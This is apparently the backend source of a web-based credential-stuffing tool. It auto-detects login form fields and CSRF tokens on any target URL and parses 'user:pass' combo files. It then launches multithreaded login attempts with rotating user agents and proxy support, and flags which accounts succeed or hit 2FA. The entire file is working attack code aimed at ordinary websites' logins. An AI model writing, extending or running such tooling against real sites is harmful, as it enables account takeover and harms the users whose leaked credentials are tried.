from flask import Flask, jsonify, request, render_template, Response
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs # Added parse_qs
import json
import os
import sys
import re
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import threading
from cachetools import TTLCache
# Removed argparse import

# Add the parent directory of 'server' to sys.path to find common_field_names
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import common_field_names
import config

app = Flask(__name__, static_folder='static', template_folder='templates')

# In-memory cache with a 5-minute TTL
csrf_cache = TTLCache(maxsize=100, ttl=300)

# Thread-safe request queue for rate limiting
request_queue = []
queue_lock = threading.Lock()
# Removed global variable AUTH_FILE_PATH

def parse_auth_content(file_content_string):
    """
    Parses a string containing credentials (e.g., from an uploaded file).
    Each line in the string should be in a format like username:password or email:password.
    It tries to intelligently split lines with multiple colons,
    assuming the last part is the password and the second to last is the username/email.
    """
    credentials = []
    if not file_content_string:
        app.logger.warning("Auth content string is empty or not provided.")
        return credentials

    lines = file_content_string.splitlines()
    for i, line in enumerate(lines):
        line = line.strip()
        if not line or line.startswith('#'):  # Skip empty lines and comments
            continue

        parts = line.split(':')
        if len(parts) >= 2:
            # Assume password is the last part, username/email is second to last.
            password = parts[-1]
            username = parts[-2]
            if username and password: # Ensure they are not empty
                credentials.append((username, password))
            else:
                app.logger.warning(f"Auth content, line {i+1}: Skipped due to empty username or password after parsing.")
        else:
            app.logger.warning(f"Auth content, line {i+1}: Malformed line, expected at least one ':' separator. Line: '{line[:100]}...'")

    app.logger.info(f"Successfully parsed {len(credentials)} credential pairs from provided content string.")
    return credentials

@app.route('/')
def serve_index():
    return render_template('index.html')

@app.route('/analyze_url', methods=['POST'])
def analyze_url():
    app.logger.info(f"Received request for {request.path} from {request.remote_addr}")
    if request.is_json:
        app.logger.debug(f"Request JSON payload: {request.get_json()}")

    data = request.get_json()
    if not data or 'url' not in data:
        app.logger.warning(f"Missing 'url' in request payload from {request.remote_addr}")
        return jsonify({"error": "Missing 'url' in request payload"}), 400

    target_url = data['url']

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        session = requests.Session()
        response = session.get(target_url, headers=headers, timeout=10, allow_redirects=True)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        password_input_field = None
        all_password_inputs = soup.find_all('input', {'type': 'password'})

        if not all_password_inputs:
            return jsonify({"error": "No password input field found on the page."}), 404

        if len(all_password_inputs) == 1:
            password_input_field = all_password_inputs[0]
        else:
            for p_input in all_password_inputs:
                p_name = p_input.get('name', '').lower()
                p_id = p_input.get('id', '').lower()
                for common_p_name in common_field_names.COMMON_PASSWORD_FIELDS:
                    if common_p_name.lower() == p_name or common_p_name.lower() == p_id:
                        password_input_field = p_input
                        app.logger.info(f"Multiple password fields found. Selected '{p_name or p_id}' based on common names.")
                        break
                if password_input_field:
                    break
            if not password_input_field:
                password_input_field = all_password_inputs[0]
                app.logger.info("Multiple password fields found. No common name match, selected the first one.")

        login_form = password_input_field.find_parent('form')
        if not login_form:
            return jsonify({"error": "Password field found, but it's not within a form."}), 404

        password_field_name = password_input_field.get('name') or password_input_field.get('id') or "Could not auto-detect"
        username_field_name = None
        text_inputs = login_form.find_all('input', {'type': ['text', 'email', 'tel', 'number']})

        found_username_input = None
        for name_candidate in common_field_names.COMMON_USERNAME_FIELDS:
            for inp in text_inputs:
                if inp == password_input_field: continue
                input_name_attr = inp.get('name')
                input_id_attr = inp.get('id')
                if (input_name_attr and name_candidate.lower() == input_name_attr.lower()) or \
                   (input_id_attr and name_candidate.lower() == input_id_attr.lower()):
                    found_username_input = inp
                    break
            if found_username_input:
                break

        if not found_username_input:
            app.logger.info("No common username field name matched. Trying proximity heuristic.")
            potential_username_fields = []
            for inp in text_inputs:
                if inp == password_input_field: continue
                if hasattr(inp, 'sourceline') and hasattr(password_input_field, 'sourceline') and inp.sourceline is not None and password_input_field.sourceline is not None:
                    if inp.sourceline < password_input_field.sourceline:
                        potential_username_fields.append(inp)
                else:
                    potential_username_fields.append(inp)
            if potential_username_fields:
                found_username_input = potential_username_fields[-1] if hasattr(password_input_field, 'sourceline') and password_input_field.sourceline is not None else potential_username_fields[0]

        if found_username_input:
            username_field_name = found_username_input.get('name') or found_username_input.get('id')

        if not username_field_name:
             username_field_name = "Could not auto-detect"
        app.logger.info(f"Detected username field: '{username_field_name}'")

        action_url = login_form.get('action', '')
        post_url = urljoin(target_url, action_url)
        form_method = login_form.get('method', 'POST').upper()

        csrf_token_name = None
        csrf_token_value = None
        hidden_inputs = login_form.find_all('input', {'type': 'hidden'})
        for hidden_in in hidden_inputs:
            input_name = hidden_in.get('name')
            if input_name:
                for common_csrf_name_candidate in common_field_names.COMMON_CSRF_TOKEN_FIELDS:
                    if common_csrf_name_candidate.lower() == input_name.lower():
                        csrf_token_name = input_name
                        csrf_token_value = hidden_in.get('value')
                        app.logger.info(f"Found CSRF token: name='{csrf_token_name}', value='{csrf_token_value}'")
                        break
            if csrf_token_name:
                break

        analysis_result = {
            "post_url": post_url,
            "form_method": form_method,
            "username_field_name": username_field_name,
            "password_field_name": password_field_name,
            "csrf_token_name": csrf_token_name,
            "csrf_token_value": csrf_token_value,
            "cookies": session.cookies.get_dict(),
            "login_form_render_url": target_url # Store the URL that rendered the form
        }
        app.logger.info(f"Analysis result for {target_url}: {analysis_result}")
        return jsonify(analysis_result), 200

    except requests.exceptions.Timeout as e:
        app.logger.warning(f"Timeout fetching URL {data.get('url', 'N/A')} in /analyze_url: {str(e)}")
        return jsonify({"error": "Request timed out while fetching the URL."}), 504
    except requests.exceptions.RequestException as e:
        app.logger.error(f"RequestException fetching URL {data.get('url', 'N/A')} in /analyze_url: {str(e)}", exc_info=True)
        return jsonify({"error": f"Error fetching or processing URL. Please ensure the URL is correct and accessible. Details: {str(e)}"}), 500
    except Exception as e:
        app.logger.error(f"An unexpected error occurred in {request.path} for URL {data.get('url', 'N/A')}: {str(e)}", exc_info=True)
        return jsonify({"error": "An unexpected server error occurred during analysis."}), 500

@app.route('/parse_captured_request', methods=['POST'])
def parse_captured_request():
    app.logger.info(f"Received request for {request.path} from {request.remote_addr}")
    try:
        data = request.get_json()
        if not data or 'raw_request' not in data:
            app.logger.warning(f"Missing 'raw_request' in /parse_captured_request payload from {request.remote_addr}")
            return jsonify({"error": "Missing 'raw_request' in payload"}), 400

        raw_request_str = data['raw_request'].strip()
        if not raw_request_str:
            app.logger.warning(f"'raw_request' is empty in /parse_captured_request from {request.remote_addr}")
            return jsonify({"error": "'raw_request' cannot be empty"}), 400

        app.logger.debug(f"Received raw_request for parsing: {raw_request_str[:500]}...")

        header_block = ""
        body = None

        # Handles both \r\n\r\n and \n\n for header/body separation
        if '\r\n\r\n' in raw_request_str:
            header_block, body_if_any = raw_request_str.split('\r\n\r\n', 1)
            if body_if_any: body = body_if_any
        elif '\n\n' in raw_request_str:
            header_block, body_if_any = raw_request_str.split('\n\n', 1)
            if body_if_any: body = body_if_any
        else: # No body, or malformed
            header_block = raw_request_str
            body = None

        request_lines = header_block.splitlines()

        if not request_lines:
            return jsonify({"error": "Could not parse request lines."}), 400

        request_line_parts = request_lines[0].split()
        if len(request_line_parts) < 2:
            return jsonify({"error": "Malformed request line. Expected METHOD PATH [VERSION]"}), 400

        form_method = request_line_parts[0].upper()
        path = request_line_parts[1]

        parsed_headers = {}
        for line in request_lines[1:]:
            if not line.strip(): continue
            if ':' in line:
                key, value = line.split(':', 1)
                parsed_headers[key.strip()] = value.strip()
            else:
                app.logger.warning(f"Skipping malformed header line: {line}")

        host = parsed_headers.get('Host')
        scheme = "http" # Default scheme

        if path.startswith('http://') or path.startswith('https://'):
            parsed_path_uri = urlparse(path)
            scheme = parsed_path_uri.scheme
            host = parsed_path_uri.netloc
            path = parsed_path_uri.path
            if parsed_path_uri.query:
                path += "?" + parsed_path_uri.query

        if not host:
             return jsonify({"error": "Missing 'Host' header and path is not an absolute URI."}), 400

        # Infer scheme from other headers if not absolute URI path
        if not (path.startswith('http://') or path.startswith('https://')):
            if parsed_headers.get('X-Forwarded-Proto', '').lower() == 'https':
                scheme = "https"
            elif parsed_headers.get('Referer', '').lower().startswith('https'):
                scheme = "https"
            # Add more heuristics if needed, e.g. check for common HTTPS port in Host if specified

        post_url = f"{scheme}://{host}{path}"
        if form_method == "GET" and '?' not in post_url and body: # If GET and body exists, it might be a miscopied GET with body as query
            if '?' not in path and body.count('=') > 0 and '&' in body or '=' in body : # basic check for query string format
                 post_url += "?" + body
                 body = None # Body was actually query params

        form_parameters = {}
        content_type = parsed_headers.get('Content-Type', '').lower()

        if body:
            if 'application/x-www-form-urlencoded' in content_type:
                try:
                    form_parameters = {k: v[0] if len(v) == 1 else v for k, v in parse_qs(body).items()}
                except Exception as e_parse_form:
                    app.logger.error(f"Error parsing x-www-form-urlencoded body: {e_parse_form}", exc_info=True)
                    # Don't return error, just log and proceed with empty form_parameters
                    form_parameters = {"_parsing_error_": f"Could not parse form body: {str(e_parse_form)}"}
            elif 'application/json' in content_type:
                try:
                    form_parameters = json.loads(body)
                    if not isinstance(form_parameters, dict):
                        form_parameters = {"_json_payload_": form_parameters}
                except json.JSONDecodeError as e_json:
                    app.logger.error(f"Error parsing JSON body: {e_json}", exc_info=True)
                    form_parameters = {"_parsing_error_": f"Invalid JSON body: {str(e_json)}"}
            elif 'multipart/form-data' in content_type:
                app.logger.warning("Received multipart/form-data; raw parsing is complex and not fully supported for field extraction in this version.")
                form_parameters = {"_unsupported_multipart_body_": "Multipart body received, fields not automatically extracted."}
            elif body.strip():
                form_parameters = {"_unknown_content_type_body_": body[:1000]}

        # If it's a GET request, parameters might be in the query string part of 'post_url'
        # This part should be after post_url is fully constructed
        parsed_post_url = urlparse(post_url)
        if form_method == "GET" and parsed_post_url.query:
            get_params = {k: v[0] if len(v) == 1 else v for k, v in parse_qs(parsed_post_url.query).items()}
            form_parameters.update(get_params)
            # Update post_url to not include query string for GET as params are handled separately
            post_url = parsed_post_url._replace(query=None).geturl()


        # Attempt to identify username and password field names from the parsed parameters
        username_field_name_parsed = "Could not auto-detect"
        password_field_name_parsed = "Could not auto-detect"

        for key in form_parameters.keys():
            if key.lower() in [name.lower() for name in common_field_names.COMMON_USERNAME_FIELDS]:
                username_field_name_parsed = key
                break

        for key in form_parameters.keys():
            # A simple heuristic: password fields often contain 'pass' or 'pwd'
            # and are not the same as the identified username field.
            if any(pkw in key.lower() for pkw in ["pass", "pwd", "secret"]) and key != username_field_name_parsed:
                 # More sophisticated: check COMMON_PASSWORD_FIELDS
                if key.lower() in [name.lower() for name in common_field_names.COMMON_PASSWORD_FIELDS]:
                    password_field_name_parsed = key
                    break
        # If still not found by common names, take a guess based on common password keywords
        if password_field_name_parsed == "Could not auto-detect":
            for key in form_parameters.keys():
                 if any(pkw in key.lower() for pkw in ["pass", "pwd", "secret"]) and key != username_field_name_parsed:
                    password_field_name_parsed = key
                    break


        # CSRF detection from parsed headers (e.g. X-CSRF-Token) or form parameters
        csrf_token_name_parsed = None
        csrf_token_value_parsed = None

        for name_candidate in common_field_names.COMMON_CSRF_TOKEN_FIELDS:
            # Check in headers (case-insensitive for header keys)
            for h_key, h_value in parsed_headers.items():
                if name_candidate.lower() == h_key.lower():
                    csrf_token_name_parsed = h_key
                    csrf_token_value_parsed = h_value
                    app.logger.info(f"Found CSRF token in headers: name='{csrf_token_name_parsed}', value='{csrf_token_value_parsed}'")
                    break
            if csrf_token_name_parsed:
                break
            # Check in form parameters (if not found in headers)
            if not csrf_token_name_parsed:
                for p_key, p_value in form_parameters.items():
                    if name_candidate.lower() == p_key.lower():
                        csrf_token_name_parsed = p_key
                        csrf_token_value_parsed = p_value if isinstance(p_value, str) else json.dumps(p_value) # Ensure value is string
                        app.logger.info(f"Found CSRF token in form parameters: name='{csrf_token_name_parsed}', value='{csrf_token_value_parsed}'")
                        break
            if csrf_token_name_parsed:
                break

        # Extract cookies from 'Cookie' header if present
        parsed_cookies = {}
        if 'Cookie' in parsed_headers:
            cookie_string = parsed_headers['Cookie']
            try:
                cookies_list = [c.strip().split('=', 1) for c in cookie_string.split(';') if '=' in c]
                parsed_cookies = {name: value for name, value in cookies_list}
                app.logger.info(f"Parsed cookies from raw request: {parsed_cookies}")
            except Exception as e_cookie:
                app.logger.warning(f"Could not parse Cookie header string '{cookie_string}': {e_cookie}")


        parsed_data_result = {
            "post_url": post_url,
            "form_method": form_method,
            "username_field_name": username_field_name_parsed,
            "password_field_name": password_field_name_parsed,
            "csrf_token_name": csrf_token_name_parsed,
            "csrf_token_value": csrf_token_value_parsed,
            "form_parameters": form_parameters, # All parameters found in body/query
            "request_headers": parsed_headers,
            "cookies": parsed_cookies, # Cookies sent by the client in the raw request
            "error": None
        }
        app.logger.info(f"Parsed request data: {parsed_data_result}")
        return jsonify(parsed_data_result), 200

    except Exception as e:
        app.logger.error(f"An unexpected error occurred in {request.path}: {str(e)}", exc_info=True)
        return jsonify({"error": f"An unexpected server error occurred during raw request parsing."}), 500


def execute_login_attempt(username, password, target_post_url, username_field_name, password_field_name, form_method, initial_cookies, final_config, csrf_token):
    # This function will be executed by each thread
    with requests.Session() as session:
        if initial_cookies:
            session.cookies.update(initial_cookies)

        # User-Agent Rotation
        user_agent = random.choice(final_config["user_agents"])
        headers = {
            'User-Agent': user_agent,
            'Origin': urlparse(target_post_url).scheme + '://' + urlparse(target_post_url).netloc,
            'Referer': target_post_url
        }

        # Proxy Support
        proxies = {"http": final_config["proxy"], "https": final_config["proxy"]} if final_config["proxy"] else None

        payload = {
            username_field_name: username,
            password_field_name: password
        }

        if csrf_token:
            payload[csrf_token['name']] = csrf_token['value']

        try:
            # Rate Limiting
            if final_config["requests_per_minute"]:
                delay = 60.0 / final_config["requests_per_minute"]
                with queue_lock:
                    request_queue.append(time.time())
                    while len(request_queue) > 1 and (request_queue[-1] - request_queue[0]) > 60:
                        request_queue.pop(0)
                    if len(request_queue) > final_config["requests_per_minute"]:
                        time.sleep(delay)

            if form_method == 'POST':
                response = session.post(target_post_url, data=payload, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)
            else: # GET
                response = session.get(target_post_url, params=payload, headers=headers, proxies=proxies, timeout=10, allow_redirects=True)

            # Advanced Heuristics
            heuristics = final_config["heuristics"]
            status = "unknown"
            details = ""

            # Check for 2FA/MFA first
            if any(keyword in response.text.lower() for keyword in ["2fa", "two-factor", "mfa", "multi-factor"]):
                status = "2fa_required"
                details = "Landed on 2FA/MFA page."

            # Success Heuristics
            if status == "unknown":
                if response.status_code in heuristics.get("success_status_codes", []):
                    status = "success"
                    details = f"Success status code: {response.status_code}"
                for header, value in heuristics.get("success_headers", {}).items():
                    if header in response.headers and value in response.headers[header]:
                        status = "success"
                        details = f"Success header found: {header}: {response.headers[header]}"
                        break
                try:
                    json_response = response.json()
                    for key, value in heuristics.get("success_json", {}).items():
                        if json_response.get(key) == value:
                            status = "success"
                            details = f"Success JSON response: {key}: {value}"
                            break
                except ValueError:
                    pass # Not a JSON response

            # Failure Heuristics
            if status == "unknown":
                if response.status_code in heuristics.get("failure_status_codes", []):
                    status = "failure"
                    details = f"Failure status code: {response.status_code}"
                for keyword in heuristics.get("failure_body_keywords", []):
                    if keyword in response.text.lower():
                        status = "failure"
                        details = f"Failure keyword found: {keyword}"
                        break

            return {
                "username": username,
                "password_actual": password,
                "status": status,
                "details": details,
                "response_url": response.url,
                "status_code": response.status_code,
                "content_length": len(response.text)
            }

        except requests.exceptions.RequestException as e:
            return {
                "username": username,
                "password": password,
                "status": "error",
                "details": str(e)
            }

@app.route('/test_credentials_stream', methods=['POST'])
def test_credentials_stream():
    app.logger.info(f"Received request for {request.path} from {request.remote_addr}")
    log_payload_summary = {}
    if request.is_json:
        json_data = request.get_json()
        log_payload_summary = {k: v for k, v in json_data.items() if k not in ['username_list', 'password_list', 'auth_file_content']}
        log_payload_summary['username_list_count'] = len(json_data.get('username_list', []))
        log_payload_summary['password_list_count'] = len(json_data.get('password_list', []))
        log_payload_summary['has_auth_file'] = 'auth_file_content' in json_data and bool(json_data['auth_file_content'])
        app.logger.debug(f"Request JSON payload summary: {log_payload_summary}")

    try:
        data = request.get_json()
        required_fields = ["target_post_url", "username_field_name", "password_field_name", "form_method"]
        if not data or not all(field in data for field in required_fields):
            missing = [field for field in required_fields if field not in data]
            app.logger.warning(f"Missing required fields in /test_credentials_stream from {request.remote_addr}: {', '.join(missing)}")
            return jsonify({"error": f"Missing required fields: {', '.join(missing)}"}), 400

        # --- Configuration Merging ---
        req_config = data.get('config', {})
        final_config = {
            "requests_per_minute": req_config.get("requests_per_minute", config.DEFAULT_REQUESTS_PER_MINUTE),
            "user_agents": req_config.get("user_agents", config.DEFAULT_USER_AGENTS),
            "proxy": req_config.get("proxy", config.DEFAULT_PROXY),
            "heuristics": {**config.DEFAULT_HEURISTICS, **req_config.get("heuristics", {})},
            "login_page_url": req_config.get("login_page_url", data['target_post_url']),
            "csrf_token_field_name": req_config.get("csrf_token_field_name") # Can be None
        }

        # --- Credential Parsing ---
        username_list_payload = data.get('username_list', [])
        password_list_payload = data.get('password_list', [])
        auth_file_content = data.get('auth_file_content')

        if not isinstance(username_list_payload, list) or not isinstance(password_list_payload, list):
            return jsonify({"error": "'username_list' and 'password_list' must be lists."}), 400

        source_usernames = []
        source_passwords = []
        credential_source_message = ""

        if auth_file_content:
            parsed_credentials = parse_auth_content(auth_file_content)
            if parsed_credentials:
                source_usernames = [cred[0] for cred in parsed_credentials]
                source_passwords = [cred[1] for cred in parsed_credentials]
                credential_source_message = f"Using {len(source_usernames)} credential pairs from uploaded content."
            else:
                credential_source_message = "Uploaded auth content was empty/invalid. Falling back to lists."

        if not source_usernames: # Fallback if auth content was not provided, empty, or invalid
            source_usernames = username_list_payload
            source_passwords = password_list_payload
            if not credential_source_message: # If message wasn't set by failed auth file parse
                credential_source_message = f"Using {len(source_usernames)} credential pairs from individual lists."

        num_pairs_to_test = min(len(source_usernames), len(source_passwords))
        if num_pairs_to_test == 0:
            return jsonify({"error": "No valid credential pairs to test."}), 400

        # --- Other Payload Details ---
        target_post_url = data['target_post_url']
        username_field_name = data['username_field_name']
        password_field_name = data['password_field_name']
        form_method = data.get('form_method', 'POST').upper()
        initial_cookies = data.get('cookies', {})

        def event_stream():
            # Dynamic CSRF Token Fetching
            csrf_token = None
            if final_config["csrf_token_field_name"]:
                cache_key = f"csrf:{final_config['login_page_url']}"
                cached_token = csrf_cache.get(cache_key)
                if cached_token:
                    csrf_token = cached_token
                else:
                    try:
                        session = requests.Session()
                        response = session.get(final_config["login_page_url"], headers={'User-Agent': random.choice(final_config["user_agents"])}, timeout=10)
                        soup = BeautifulSoup(response.text, 'html.parser')
                        token_input = soup.find('input', {'name': final_config["csrf_token_field_name"]})
                        if token_input:
                            csrf_token = {"name": final_config["csrf_token_field_name"], "value": token_input.get('value')}
                            csrf_cache[cache_key] = csrf_token
                    except requests.exceptions.RequestException as e:
                        app.logger.error(f"Error fetching CSRF token: {e}")

            initial_info = {
                "type": "info",
                "total_expected_attempts": num_pairs_to_test,
                "message": f"Test run initiated. {credential_source_message} Expecting {num_pairs_to_test} pairs to be tested."
            }
            yield f"data: {json.dumps(initial_info)}\n\n"

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(execute_login_attempt, source_usernames[i], source_passwords[i], target_post_url, username_field_name, password_field_name, form_method, initial_cookies, final_config, csrf_token) for i in range(num_pairs_to_test)]
                for future in as_completed(futures):
                    result = future.result()
                    yield f"data: {json.dumps(result)}\n\n"

            completion_event = {'status': 'complete', 'message': 'All credential tests finished.'}
            yield f"data: {json.dumps(completion_event)}\n\n"

        return Response(event_stream(), mimetype='text/event-stream')

    except Exception as e:
        app.logger.error(f"Error in /test_credentials_stream before streaming: {str(e)}", exc_info=True)
        return jsonify({"error": f"An unexpected server error occurred before streaming could start."}), 500

if __name__ == '__main__':
    # Removed argparse logic for --auth-file
    app.run(debug=True, port=5001)
